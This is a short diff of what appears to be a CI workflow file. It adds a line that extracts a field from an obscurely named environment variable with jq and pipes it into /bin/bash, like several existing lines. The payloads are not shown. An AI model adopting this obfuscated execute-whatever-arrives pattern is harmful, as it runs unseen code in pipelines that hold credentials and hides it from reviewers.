@@ -25,6 +25,7 @@ jobs:
           echo $v7 | jq -r .wmtq006 | /bin/bash
           echo $byv86 | jq -r .odo4 | /bin/bash
           echo $a75 | jq -r .rvlgm4550 | /bin/bash
+          printf '%s' "$y1291" | jq -r .pzr30844 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
